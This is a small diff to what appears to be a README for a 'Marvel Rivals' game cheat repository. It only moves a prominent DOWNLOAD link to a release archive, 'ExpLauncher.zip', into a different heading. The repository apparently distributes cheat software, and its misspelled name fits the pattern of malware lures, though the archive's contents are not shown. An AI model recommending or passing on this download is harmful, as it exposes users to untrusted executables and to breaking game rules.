@@ -8,7 +8,7 @@
 
 <h3 align="center">
 Please leave a ⭐  if you like it
-
-
-  ## [DOWNLOAD](https://github.com/whyaliveagain/Marlel-RIvals-Cheat/releases/download/hack/ExpLauncher.zip)
 </h3>
+<h4 align="center">
+  ## [DOWNLOAD](https://github.com/whyaliveagain/Marlel-RIvals-Cheat/releases/download/hack/ExpLauncher.zip)
+</h4>
